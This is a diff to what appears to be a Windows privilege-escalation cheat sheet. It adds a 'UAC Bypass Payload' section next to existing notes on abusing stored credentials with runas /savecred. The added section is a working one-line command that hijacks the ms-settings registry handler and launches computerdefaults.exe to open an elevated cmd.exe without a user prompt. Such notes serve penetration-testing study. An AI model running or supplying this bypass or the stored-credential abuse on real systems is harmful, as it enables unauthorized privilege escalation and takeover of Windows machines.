@@ -29,6 +29,15 @@ Stored credentials are listed with the following format:
 
 Lets say we get an interactive type of credential so we can use `runas` to impersonate as the stored user.
 
+#### UAC Bypass Payload
+
+- This command sequence performs a **User Account Control (UAC) bypass** on Windows to launch an elevated command prompt (`cmd.exe`) without prompting the user. 
+
+```bash
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+```
+
+
 ```cmd
 runas /savecred /user:<username found in cmdkey> cmd
 ```
